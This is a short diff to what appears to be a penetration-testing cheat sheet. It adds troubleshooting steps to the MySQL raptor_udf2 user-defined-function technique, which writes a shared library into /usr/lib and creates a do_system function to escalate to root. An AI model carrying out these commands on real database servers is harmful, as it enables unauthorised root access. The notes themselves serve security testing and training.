@@ -2456,6 +2456,13 @@ insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 ## create UDF
 create function do_system returns integer soname 'raptor_udf2.so';
+## optional, if file not found error : locate correct folder
+### check for other functions
+select * from mysql.func;
+### note .so name
+### return to shell
+find /usr -name "*.so" |grep name_here
+### return to mysql + repeat above steps with correct path
 ## check import
 select * from mysql.func;
 ## priv esc to root (if mysqld runs as root!)
